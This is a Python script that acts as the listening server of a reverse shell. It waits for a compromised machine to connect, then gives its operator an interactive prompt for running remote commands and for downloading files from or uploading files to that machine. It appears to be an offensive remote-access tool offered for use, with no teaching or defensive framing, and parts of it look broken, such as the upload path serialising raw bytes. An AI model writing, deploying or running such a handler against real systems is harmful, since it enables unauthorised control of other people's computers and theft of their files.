#!/usr/bin/python

import sys
import json
import base64
import socket
from termcolor import colored


def s_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode("utf-8"))

def s_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024).decode("utf-8")
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = input("Shell@{}~".format(ip[0]))
        s_send(command)
        if command == "q":
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as fout:
                file_data = s_recv()
                fout.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    s_send(base64.b64encode(fin.read()))
            except:
                print(colored("Upload Failed !!!", "red"))
        else:
            result = s_recv()
            print(result)

def server ():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((sys.argv[1],int(sys.argv[2])))
    s.listen(5)
    print(colored("[+] Listening For Incoming Connections", "green"))
    target, ip = s.accept()
    print(colored("[+] Connection Established From : {}".format(ip), "green"))
    
server()
shell()
s.close()
print(colored("Closing connection !!!", "red"))
sys.exit()